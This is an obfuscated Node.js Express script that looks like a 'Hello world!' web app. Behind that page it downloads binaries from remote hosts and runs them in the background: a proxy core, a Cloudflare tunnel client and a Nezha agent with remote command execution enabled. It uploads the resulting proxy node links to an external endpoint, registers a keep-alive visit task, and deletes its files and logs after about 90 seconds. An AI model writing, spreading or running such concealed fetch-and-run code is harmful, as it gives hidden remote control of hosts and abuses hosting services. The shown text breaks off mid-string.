const _0x2de8c4=_0x242c;(function(_0x277b1e,_0x33b07e){const _0x1cb685=_0x242c,_0x3f6409=_0x277b1e();while(!![]){try{const _0x21c35e=-parseInt(_0x1cb685(0xe6))/0x1*(parseInt(_0x1cb685(0xb5))/0x2)+-parseInt(_0x1cb685(0xff))/0x3*(parseInt(_0x1cb685(0xc8))/0x4)+parseInt(_0x1cb685(0xc9))/0x5*(-parseInt(_0x1cb685(0x111))/0x6)+parseInt(_0x1cb685(0x105))/0x7*(-parseInt(_0x1cb685(0xf5))/0x8)+-parseInt(_0x1cb685(0xc3))/0x9+parseInt(_0x1cb685(0x134))/0xa+parseInt(_0x1cb685(0x160))/0xb;if(_0x21c35e===_0x33b07e)break;else _0x3f6409['push'](_0x3f6409['shift']());}catch(_0x2f870d){_0x3f6409['push'](_0x3f6409['shift']());}}}(_0x2bd0,0x43546));const express=require(_0x2de8c4(0x140)),app=express(),axios=require(_0x2de8c4(0x131)),os=require('os'),fs=require('fs'),path=require(_0x2de8c4(0xac)),{promisify}=require(_0x2de8c4(0x11e)),exec=promisify(require(_0x2de8c4(0xe5))['exec']),{execSync}=require(_0x2de8c4(0xe5)),UPLOAD_URL=process[_0x2de8c4(0x12b)][_0x2de8c4(0x106)]||'',PROJECT_URL=process['env'][_0x2de8c4(0xcb)]||'',AUTO_ACCESS=process[_0x2de8c4(0x12b)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x2de8c4(0x116)]||_0x2de8c4(0xdf),SUB_PATH=process[_0x2de8c4(0x12b)][_0x2de8c4(0x11c)]||_0x2de8c4(0xcf),PORT=process[_0x2de8c4(0x12b)]['SERVER_PORT']||process[_0x2de8c4(0x12b)]['PORT']||0xbb8,UUID=process['env'][_0x2de8c4(0x10c)]||_0x2de8c4(0xe0),NEZHA_SERVER=process[_0x2de8c4(0x12b)][_0x2de8c4(0x100)]||'',NEZHA_PORT=process[_0x2de8c4(0x12b)][_0x2de8c4(0xb1)]||'',NEZHA_KEY=process[_0x2de8c4(0x12b)][_0x2de8c4(0xd5)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x2de8c4(0x110),ARGO_AUTH=process['env'][_0x2de8c4(0xcd)]||_0x2de8c4(0xcc),ARGO_PORT=process['env'][_0x2de8c4(0xf1)]||0x1f41,CFIP=process[_0x2de8c4(0x12b)]['CFIP']||_0x2de8c4(0x12f),CFPORT=process[_0x2de8c4(0x12b)][_0x2de8c4(0xc5)]||0x1bb,NAME=process[_0x2de8c4(0x12b)]['NAME']||_0x2de8c4(0x103);!fs[_0x2de8c4(0x10e)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2de8c4(0xe9)](FILE_PATH+_0x2de8c4(0x117))):console[_0x2de8c4(0xe9)](FILE_PATH+_0x2de8c4(0x14e));function generateRandomName(){const _0x341004=_0x2de8c4,_0xcc2bcd=_0x341004(0x115);let _0x589868='';for(let _0x50d237=0x0;_0x50d237<0x6;_0x50d237++){_0x589868+=_0xcc2bcd['charAt'](Math[_0x341004(0x156)](Math['random']()*_0xcc2bcd['length']));}return _0x589868;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x2de8c4(0x13f)](FILE_PATH,phpName),webPath=path[_0x2de8c4(0x13f)](FILE_PATH,webName),botPath=path[_0x2de8c4(0x13f)](FILE_PATH,botName),subPath=path[_0x2de8c4(0x13f)](FILE_PATH,'sub.txt'),listPath=path[_0x2de8c4(0x13f)](FILE_PATH,_0x2de8c4(0x168)),bootLogPath=path[_0x2de8c4(0x13f)](FILE_PATH,_0x2de8c4(0xce)),configPath=path['join'](FILE_PATH,_0x2de8c4(0x133));function deleteNodes(){const _0x11a92b=_0x2de8c4;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3fb76a;try{_0x3fb76a=fs[_0x11a92b(0x109)](subPath,'utf-8');}catch{return null;}const _0x3bc162=Buffer[_0x11a92b(0x158)](_0x3fb76a,_0x11a92b(0x13a))['toString']('utf-8'),_0x15d2ec=_0x3bc162[_0x11a92b(0x169)]('\x0a')['filter'](_0x292790=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x11a92b(0x11f)](_0x292790));if(_0x15d2ec[_0x11a92b(0xf9)]===0x0)return;return axios[_0x11a92b(0x137)](UPLOAD_URL+_0x11a92b(0x12e),JSON[_0x11a92b(0x166)]({'nodes':_0x15d2ec}),{'headers':{'Content-Type':_0x11a92b(0x157)}})[_0x11a92b(0xbf)](_0x3c85b7=>{return null;}),null;}catch(_0x3295a2){return null;}}function cleanupOldFiles(){const _0x5ec4a7=_0x2de8c4;try{const _0x4faa3b=fs[_0x5ec4a7(0x129)](FILE_PATH);_0x4faa3b[_0x5ec4a7(0x125)](_0x7cfec9=>{const _0x57b911=_0x5ec4a7,_0x2712cc=path[_0x57b911(0x13f)](FILE_PATH,_0x7cfec9);try{const _0x526f41=fs[_0x57b911(0xee)](_0x2712cc);_0x526f41[_0x57b911(0xb9)]()&&fs[_0x57b911(0x170)](_0x2712cc);}catch(_0x58cd5b){}});}catch(_0x368d0a){}}app[_0x2de8c4(0x112)]('/',function(_0x5542ac,_0x56a6a3){const _0xacbfb9=_0x2de8c4;_0x56a6a3['send'](_0xacbfb9(0x120));});async function generateConfig(){const _0x1ceaa2=_0x2de8c4,_0x2c2e60={'log':{'access':_0x1ceaa2(0xd9),'error':_0x1ceaa2(0xd9),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1ceaa2(0x10b),'settings':{'clients':[{'id':UUID,'flow':_0x1ceaa2(0xd3)}],'decryption':_0x1ceaa2(0x121),'fallbacks':[{'dest':0xbb9},{'path':_0x1ceaa2(0xd1),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x1ceaa2(0x146),'dest':0xbbc}]},'streamSettings':{'network':_0x1ceaa2(0x13b)}},{'port':0xbb9,'listen':_0x1ceaa2(0x142),'protocol':_0x1ceaa2(0x10b),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x1ceaa2(0x121)}},{'port':0xbba,'listen':_0x1ceaa2(0x142),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1ceaa2(0x121)},'streamSettings':{'network':'ws','security':_0x1ceaa2(0x121),'wsSettings':{'path':_0x1ceaa2(0xd1)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1ceaa2(0xbb),_0x1ceaa2(0x16a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1ceaa2(0x142),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1ceaa2(0x11b)}},'sniffing':{'enabled':!![],'destOverride':[_0x1ceaa2(0x16e),_0x1ceaa2(0xbb),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1ceaa2(0x142),'protocol':_0x1ceaa2(0x162),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1ceaa2(0x121),'wsSettings':{'path':_0x1ceaa2(0x146)}},'sniffing':{'enabled':!![],'destOverride':[_0x1ceaa2(0x16e),_0x1ceaa2(0xbb),_0x1ceaa2(0x16a)],'metadataOnly':![]}}],'dns':{'servers':[_0x1ceaa2(0xad)]},'outbounds':[{'protocol':_0x1ceaa2(0x16f),'tag':_0x1ceaa2(0x153)},{'protocol':_0x1ceaa2(0xb3),'tag':_0x1ceaa2(0xb0)}]};fs[_0x1ceaa2(0x151)](path[_0x1ceaa2(0x13f)](FILE_PATH,'config.json'),JSON[_0x1ceaa2(0x166)](_0x2c2e60,null,0x2));}function getSystemArchitecture(){const _0x8ae665=_0x2de8c4,_0x4317c2=os[_0x8ae665(0x130)]();return _0x4317c2===_0x8ae665(0x16b)||_0x4317c2===_0x8ae665(0xba)||_0x4317c2===_0x8ae665(0xe7)?_0x8ae665(0x16b):'amd';}function _0x242c(_0x3fca43,_0x5d82f1){_0x3fca43=_0x3fca43-0xa9;const _0x2bd09c=_0x2bd0();let _0x242ca4=_0x2bd09c[_0x3fca43];return _0x242ca4;}function downloadFile(_0x520fa1,_0x21faef,_0x7e81b8){const _0x3ba157=_0x2de8c4,_0x465871=_0x520fa1;!fs[_0x3ba157(0x10e)](FILE_PATH)&&fs[_0x3ba157(0xaf)](FILE_PATH,{'recursive':!![]});const _0x41b768=fs[_0x3ba157(0xef)](_0x465871);axios({'method':'get','url':_0x21faef,'responseType':_0x3ba157(0xdb)})['then'](_0x112112=>{const _0x8d6288=_0x3ba157;_0x112112[_0x8d6288(0x126)]['pipe'](_0x41b768),_0x41b768['on'](_0x8d6288(0x13d),()=>{const _0x122ff1=_0x8d6288;_0x41b768[_0x122ff1(0x102)](),console[_0x122ff1(0xe9)](_0x122ff1(0x11a)+path[_0x122ff1(0x123)](_0x465871)+'\x20successfully'),_0x7e81b8(null,_0x465871);}),_0x41b768['on']('error',_0x4db093=>{const _0xf7029d=_0x8d6288;fs[_0xf7029d(0xfa)](_0x465871,()=>{});const _0x259c27=_0xf7029d(0x11a)+path[_0xf7029d(0x123)](_0x465871)+_0xf7029d(0x149)+_0x4db093['message'];console[_0xf7029d(0xb2)](_0x259c27),_0x7e81b8(_0x259c27);});})[_0x3ba157(0xbf)](_0x41cc63=>{const _0x57a769=_0x3ba157,_0x45f0cb='Download\x20'+path[_0x57a769(0x123)](_0x465871)+_0x57a769(0x149)+_0x41cc63['message'];console['error'](_0x45f0cb),_0x7e81b8(_0x45f0cb);});}async function downloadFilesAndRun(){const _0x2b3d7f=_0x2de8c4,_0x39ba9c=getSystemArchitecture(),_0x29a764=getFilesForArchitecture(_0x39ba9c);if(_0x29a764[_0x2b3d7f(0xf9)]===0x0){console[_0x2b3d7f(0xe9)](_0x2b3d7f(0xe4));return;}const _0x51fed6=_0x29a764[_0x2b3d7f(0x12c)](_0x468e2a=>{return new Promise((_0x417882,_0x1834d2)=>{const _0x28e638=_0x242c;downloadFile(_0x468e2a['fileName'],_0x468e2a[_0x28e638(0xf2)],(_0x1ff1bc,_0x1f8964)=>{_0x1ff1bc?_0x1834d2(_0x1ff1bc):_0x417882(_0x1f8964);});});});try{await Promise[_0x2b3d7f(0x159)](_0x51fed6);}catch(_0x1056a7){console[_0x2b3d7f(0xb2)](_0x2b3d7f(0x11d),_0x1056a7);return;}function _0x44f0aa(_0x32b521){const _0x2c5225=_0x2b3d7f,_0x1f0694=0x1fd;_0x32b521[_0x2c5225(0x125)](_0xc17c16=>{const _0x17e59c=_0x2c5225;fs[_0x17e59c(0x10e)](_0xc17c16)&&fs[_0x17e59c(0xbc)](_0xc17c16,_0x1f0694,_0x41f929=>{const _0x2f2734=_0x17e59c;_0x41f929?console[_0x2f2734(0xb2)](_0x2f2734(0x12a)+_0xc17c16+':\x20'+_0x41f929):console['log']('Empowerment\x20success\x20for\x20'+_0xc17c16+':\x20'+_0x1f0694[_0x2f2734(0xc0)](0x8));});});}const _0x5917b4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x44f0aa(_0x5917b4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4f6984=NEZHA_SERVER[_0x2b3d7f(0x164)](':')?NEZHA_SERVER['split'](':')[_0x2b3d7f(0x13c)]():'',_0x6325be=new Set(['443',_0x2b3d7f(0xda),_0x2b3d7f(0x124),_0x2b3d7f(0xea),_0x2b3d7f(0xc2),_0x2b3d7f(0xeb)]),_0x30856d=_0x6325be[_0x2b3d7f(0xe8)](_0x4f6984)?_0x2b3d7f(0x143):'false',_0x12306a=_0x2b3d7f(0x118)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x30856d+_0x2b3d7f(0x165)+UUID;fs[_0x2b3d7f(0x151)](path[_0x2b3d7f(0x13f)](FILE_PATH,_0x2b3d7f(0xec)),_0x12306a);const _0x22f53b=_0x2b3d7f(0x163)+phpPath+_0x2b3d7f(0x144)+FILE_PATH+_0x2b3d7f(0xb6);try{await exec(_0x22f53b),console[_0x2b3d7f(0xe9)](phpName+_0x2b3d7f(0x15b)),await new Promise(_0x455ea0=>setTimeout(_0x455ea0,0x3e8));}catch(_0x13a7f5){console['error'](_0x2b3d7f(0x127)+_0x13a7f5);}}else{let _0xe7f23='';const _0x138b7f=['443',_0x2b3d7f(0xda),_0x2b3d7f(0x124),'2087',_0x2b3d7f(0xc2),_0x2b3d7f(0xeb)];_0x138b7f[_0x2b3d7f(0x164)](NEZHA_PORT)&&(_0xe7f23=_0x2b3d7f(0xfe));const _0xef74e3=_0x2b3d7f(0x163)+npmPath+_0x2b3d7f(0xc1)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xe7f23+_0x2b3d7f(0xd2);try{await exec(_0xef74e3),console[_0x2b3d7f(0xe9)](npmName+_0x2b3d7f(0x15b)),await new Promise(_0xe2b730=>setTimeout(_0xe2b730,0x3e8));}catch(_0x3b8b47){console[_0x2b3d7f(0xb2)](_0x2b3d7f(0xb8)+_0x3b8b47);}}}else console[_0x2b3d7f(0xe9)](_0x2b3d7f(0x108));const _0x31a8aa=_0x2b3d7f(0x163)+webPath+_0x2b3d7f(0xf6)+FILE_PATH+_0x2b3d7f(0x138);try{await exec(_0x31a8aa),console[_0x2b3d7f(0xe9)](webName+_0x2b3d7f(0x15b)),await new Promise(_0x201257=>setTimeout(_0x201257,0x3e8));}catch(_0x38b7c1){console[_0x2b3d7f(0xb2)](_0x2b3d7f(0xd4)+_0x38b7c1);}if(fs[_0x2b3d7f(0x10e)](botPath)){let _0x290f5b;if(ARGO_AUTH[_0x2b3d7f(0x155)](/^[A-Z0-9a-z=]{120,250}$/))_0x290f5b=_0x2b3d7f(0xd7)+ARGO_AUTH;else ARGO_AUTH[_0x2b3d7f(0x155)](/TunnelSecret/)?_0x290f5b=_0x2b3d7f(0x15e)+FILE_PATH+_0x2b3d7f(0x113):_0x290f5b=_0x2b3d7f(0xb4)+FILE_PATH+_0x2b3d7f(0xbe)+ARGO_PORT;try{await exec(_0x2b3d7f(0x163)+botPath+'\x20'+_0x290f5b+_0x2b3d7f(0x136)),console[_0x2b3d7f(0xe9)](botName+_0x2b3d7f(0x15b)),await new Promise(_0x17e2fb=>setTimeout(_0x17e2fb,0x7d0));}catch(_0x3a83d0){console[_0x2b3d7f(0xb2)](_0x2b3d7f(0x14c)+_0x3a83d0);}}await new Promise(_0x348cee=>setTimeout(_0x348cee,0x1388));}function getFilesForArchitecture(_0x3c0532){const _0x33ecd2=_0x2de8c4;let _0x1d441b;_0x3c0532===_0x33ecd2(0x16b)?_0x1d441b=[{'fileName':webPath,'fileUrl':_0x33ecd2(0x167)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x1d441b=[{'fileName':webPath,'fileUrl':_0x33ecd2(0xf4)},{'fileName':botPath,'fileUrl':_0x33ecd2(0x135)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x40be2d=_0x3c0532===_0x33ecd2(0x16b)?_0x33ecd2(0xfd):_0x33ecd2(0x14b);_0x1d441b[_0x33ecd2(0x104)]({'fileName':npmPath,'fileUrl':_0x40be2d});}else{const _0x76e85c=_0x3c0532===_0x33ecd2(0x16b)?_0x33ecd2(0x10d):_0x33ecd2(0x13e);_0x1d441b[_0x33ecd2(0x104)]({'fileName':phpPath,'fileUrl':_0x76e85c});}}return _0x1d441b;}function argoType(){const _0xe2458f=_0x2de8c4;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xe2458f(0xe9)](_0xe2458f(0xf0));return;}if(ARGO_AUTH[_0xe2458f(0x164)]('TunnelSecret')){fs['writeFileSync'](path[_0xe2458f(0x13f)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4604d2=_0xe2458f(0x152)+ARGO_AUTH[_0xe2458f(0x169)]('\x22')[0xb]+_0xe2458f(0xe3)+path[_0xe2458f(0x13f)](FILE_PATH,'tunnel.json')+_0xe2458f(0xc7)+ARGO_DOMAIN+_0xe2458f(0xae)+ARGO_PORT+_0xe2458f(0x10a);fs['writeFileSync'](path[_0xe2458f(0x13f)](FILE_PATH,'tunnel.yml'),_0x4604d2);}else console[_0xe2458f(0xe9)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x421a3f=_0x2de8c4;let _0x297662;if(ARGO_AUTH&&ARGO_DOMAIN)_0x297662=ARGO_DOMAIN,console[_0x421a3f(0xe9)]('ARGO_DOMAIN:',_0x297662),await _0x4c60af(_0x297662);else try{const _0x128d67=fs[_0x421a3f(0x109)](path[_0x421a3f(0x13f)](FILE_PATH,_0x421a3f(0xce)),_0x421a3f(0xd8)),_0x1bbf87=_0x128d67[_0x421a3f(0x169)]('\x0a'),_0x573f52=[];_0x1bbf87[_0x421a3f(0x125)](_0x1e6a4f=>{const _0x380172=_0x421a3f,_0x2bbd8b=_0x1e6a4f[_0x380172(0x155)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2bbd8b){const _0x132ff0=_0x2bbd8b[0x1];_0x573f52[_0x380172(0x15f)](_0x132ff0);}});if(_0x573f52[_0x421a3f(0xf9)]>0x0)_0x297662=_0x573f52[0x0],console[_0x421a3f(0xe9)](_0x421a3f(0x16c),_0x297662),await _0x4c60af(_0x297662);else{console[_0x421a3f(0xe9)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x421a3f(0x170)](path[_0x421a3f(0x13f)](FILE_PATH,_0x421a3f(0xce)));async function _0x53040b(){const _0xf3471f=_0x421a3f;try{process['platform']===_0xf3471f(0x12d)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0xf3471f(0xc4)):await exec(_0xf3471f(0x15c)+botName[_0xf3471f(0x15d)](0x0)+']'+botName[_0xf3471f(0xdd)](0x1)+_0xf3471f(0xab));}catch(_0x6f8fa7){}}_0x53040b(),await new Promise(_0x2058ca=>setTimeout(_0x2058ca,0xbb8));const _0x4094c1=_0x421a3f(0xb4)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x421a3f(0x163)+botPath+'\x20'+_0x4094c1+_0x421a3f(0x136)),console[_0x421a3f(0xe9)](botName+'\x20is\x20running'),await new Promise(_0x59deb1=>setTimeout(_0x59deb1,0xbb8)),await extractDomains();}catch(_0x14c02e){console[_0x421a3f(0xb2)](_0x421a3f(0x14c)+_0x14c02e);}}}catch(_0x4d7dab){console['error'](_0x421a3f(0xa9),_0x4d7dab);}async function _0x46d193(){const _0x546035=_0x421a3f;try{const _0x5bd384=await axios['get'](_0x546035(0xdc),{'timeout':0xbb8});if(_0x5bd384[_0x546035(0x126)]&&_0x5bd384[_0x546035(0x126)][_0x546035(0x14a)]&&_0x5bd384[_0x546035(0x126)][_0x546035(0xaa)])return _0x5bd384['data'][_0x546035(0x14a)]+'_'+_0x5bd384[_0x546035(0x126)]['org'];}catch(_0x5889bb){try{const _0x48d734=await axios['get'](_0x546035(0x147),{'timeout':0xbb8});if(_0x48d734[_0x546035(0x126)]&&_0x48d734[_0x546035(0x126)][_0x546035(0xf7)]===_0x546035(0xed)&&_0x48d734[_0x546035(0x126)][_0x546035(0x114)]&&_0x48d734[_0x546035(0x126)][_0x546035(0xaa)])return _0x48d734[_0x546035(0x126)]['countryCode']+'_'+_0x48d734[_0x546035(0x126)]['org'];}catch(_0x2cb0f2){}}return'Unknown';}async function _0x4c60af(_0x436621){const _0x120fc5=await _0x46d193(),_0x7d7f6b=NAME?NAME+'-'+_0x120fc5:_0x120fc5;return new Promise(_0x2276b1=>{setTimeout(()=>{const _0x2d3c0=_0x242c,_0x1cca3e={'v':'2','ps':''+_0x7d7f6b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x2d3c0(0x121),'host':_0x436621,'path':_0x2d3c0(0x15a),'tls':_0x2d3c0(0xbb),'sni':_0x436621,'alpn':'','fp':_0x2d3c0(0xbd)},_0xe28002='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x436621+'&fp=firefox&type=ws&host='+_0x436621+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x7d7f6b+_0x2d3c0(0xf3)+Buffer[_0x2d3c0(0x158)](JSON[_0x2d3c0(0x166)](_0x1cca3e))[_0x2d3c0(0xc0)](_0x2d3c0(0x13a))+_0x2d3c0(0x14d)+UUID+'@'+CFIP+':'+CFPORT+_0x2d3c0(0x128)+_0x436621+_0x2d3c0(0xfb)+_0x436621+_0x2d3c0(0xb7)+_0x7d7f6b+_0x2d3c0(0x150);console[_0x2d3c0(0xe9)](Buffer[_0x2d3c0(0x158)](_0xe28002)[_0x2d3c0(0xc0)](_0x2d3c0(0x13a))),fs[_0x2d3c0(0x151)](subPath,Buffer[_0x2d3c0(0x158)](_0xe28002)[_0x2d3c0(0xc0)](_0x2d3c0(0x13a))),console[_0x2d3c0(0xe9)](FILE_PATH+_0x2d3c0(0xf8)),uploadNodes(),app[_0x2d3c0(0x112)]('/'+SUB_PATH,(_0x9dcd6d,_0x519ad6)=>{const _0x4d426c=_0x2d3c0,_0x99dc38=Buffer[_0x4d426c(0x158)](_0xe28002)[_0x4d426c(0xc0)](_0x4d426c(0x13a));_0x519ad6[_0x4d426c(0xe2)](_0x4d426c(0xd6),_0x4d426c(0x148)),_0x519ad6[_0x4d426c(0x122)](_0x99dc38);}),_0x2276b1(_0xe28002);},0x7d0);});}}async function uploadNodes(){const _0x1a1580=_0x2de8c4;if(UPLOAD_URL&&PROJECT_URL){const _0x97b195=PROJECT_URL+'/'+SUB_PATH,_0x1f7cf5={'subscription':[_0x97b195]};try{const _0x227cf2=await axios[_0x1a1580(0x137)](UPLOAD_URL+_0x1a1580(0xfc),_0x1f7cf5,{'headers':{'Content-Type':'application/json'}});return _0x227cf2&&_0x227cf2[_0x1a1580(0xf7)]===0xc8?(console[_0x1a1580(0xe9)]('Subscription\x20uploaded\x20successfully'),_0x227cf2):null;}catch(_0x127195){if(_0x127195[_0x1a1580(0x119)]){if(_0x127195['response'][_0x1a1580(0xf7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1a1580(0x10e)](listPath))return;const _0x10d3ae=fs[_0x1a1580(0x109)](listPath,_0x1a1580(0xd8)),_0xca5072=_0x10d3ae[_0x1a1580(0x169)]('\x0a')[_0x1a1580(0x145)](_0x417e2b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x417e2b));if(_0xca5072[_0x1a1580(0xf9)]===0x0)return;const _0x17ea16=JSON['stringify']({'nodes':_0xca5072});try{const _0x3df8aa=await axios[_0x1a1580(0x137)](UPLOAD_URL+_0x1a1580(0x161),_0x17ea16,{'headers':{'Content-Type':'application/json'}});return _0x3df8aa&&_0x3df8aa[_0x1a1580(0xf7)]===0xc8?(console[_0x1a1580(0xe9)](_0x1a1580(0xe1)),_0x3df8aa):null;}catch(_0x230978){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xe01f55=_0x242c,_0x38b5b5=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x38b5b5[_0xe01f55(0x15f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x38b5b5[_0xe01f55(0x15f)](phpPath);process['platform']===_0xe01f55(0x12d)?exec('del\x20/f\x20/q\x20'+_0x38b5b5['join']('\x20')+_0xe01f55(0x132),_0x2dd334=>{const _0x399a97=_0xe01f55;console[_0x399a97(0xd0)](),console[_0x399a97(0xe9)](_0x399a97(0xc6)),console[_0x399a97(0xe9)](_0x399a97(0xde));}):exec(_0xe01f55(0xca)+_0x38b5b5[_0xe01f55(0x13f)]('\x20')+_0xe01f55(0x154),_0x36370e=>{const _0x20590d=_0xe01f55;console[_0x20590d(0xd0)](),console[_0x20590d(0xe9)](_0x20590d(0xc6)),console[_0x20590d(0xe9)](_0x20590d(0xde));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5a3412=_0x2de8c4;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5a3412(0xe9)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x14c231=await axios[_0x5a3412(0x137)](_0x5a3412(0x14f),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5a3412(0x157)}});return console[_0x5a3412(0xe9)](_0x5a3412(0x16d)),_0x14c231;}catch(_0x48e80a){return console[_0x5a3412(0xb2)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x48e80a[_0x5a3412(0x107)]),null;}}async function startserver(){const _0x49fc72=_0x2de8c4;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x45b2cc){console['error'](_0x49fc72(0x139),_0x45b2cc);}}function _0x2bd0(){const _0x150fb4=['all','/vmess-argo?ed=2560','\x20is\x20running','pkill\x20-f\x20\x22[','charAt','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','push','12666269EpcgoU','/api/add-nodes','trojan','nohup\x20','includes','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','stringify','https://arm64.ssss.nyc.mn/web','list.txt','split','quic','arm','ArgoDomain:','automatic\x20access\x20task\x20added\x20successfully','http','freedom','unlinkSync','Error\x20reading\x20boot.log:','org','\x22\x20>\x20/dev/null\x202>&1','path','https+local://8.8.8.8/dns-query','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','mkdirSync','block','NEZHA_PORT','error','blackhole','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','74862rcgPgw','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','&path=%2Ftrojan-argo%3Fed%3D2560#','npm\x20running\x20error:\x20','isFile','arm64','tls','chmod','firefox','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','catch','toString','\x20-s\x20','2083','149940qiwIxR','.exe\x20>\x20nul\x202>&1','CFPORT','App\x20is\x20running','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','698628LTloQQ','5jjJLMk','rm\x20-rf\x20','PROJECT_URL','eyJhIjoiMGEzN2ViNWI0NzQ2NDQ1YjRhNjljNWY3MGJlZTYyODUiLCJ0IjoiMzI4YmYyNmMtMDM5Mi00ZmFiLWE4YmItOTE5N2M0ZjczMGJjIiwicyI6Ik0yWTNPV1F3TnprdE16WTRaQzAwWldSakxUaGhaRFV0TkRaa05HTmtZV1F3TW1ZMSJ9','ARGO_AUTH','boot.log','sub','clear','/vless-argo','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','xtls-rprx-vision','web\x20running\x20error:\x20','NEZHA_KEY','Content-Type','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','utf-8','/dev/null','8443','stream','https://ipapi.co/json/','substring','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','./tmp','907371ff-a412-4860-89b2-7308b3669255','Nodes\x20uploaded\x20successfully','set','\x0a\x20\x20credentials-file:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','child_process','3oIaLpY','aarch64','has','log','2087','2053','config.yaml','success','statSync','createWriteStream','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ARGO_PORT','fileUrl','\x0a\x0avmess://','https://amd64.ssss.nyc.mn/web','8YXNTOU','\x20-c\x20','status','/sub.txt\x20saved\x20successfully','length','unlink','&fp=firefox&type=ws&host=','/api/add-subscriptions','https://arm64.ssss.nyc.mn/agent','--tls','9UQPbKt','NEZHA_SERVER','http\x20server\x20is\x20running\x20on\x20port:','close','wangluo','unshift','2144947qQUZTp','UPLOAD_URL','message','NEZHA\x20variable\x20is\x20empty,skip\x20running','readFileSync','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','vless','UUID','https://arm64.ssss.nyc.mn/v1','existsSync','listen','wangluo.daashixiong.qzz.io','1254354qlLjde','get','/tunnel.yml\x20run','countryCode','abcdefghijklmnopqrstuvwxyz','FILE_PATH','\x20is\x20created','\x0aclient_secret:\x20','response','Download\x20','/vmess-argo','SUB_PATH','Error\x20downloading\x20files:','util','test','Hello\x20world!','none','send','basename','2096','forEach','data','php\x20running\x20error:\x20','?security=tls&sni=','readdirSync','Empowerment\x20failed\x20for\x20','env','map','win32','/api/delete-nodes','cdns.doon.eu.org','arch','axios','\x20>\x20nul\x202>&1','config.json','2927070JvhUuU','https://amd64.ssss.nyc.mn/bot','\x20>/dev/null\x202>&1\x20&','post','/config.json\x20>/dev/null\x202>&1\x20&','Error\x20in\x20startserver:','base64','tcp','pop','finish','https://amd64.ssss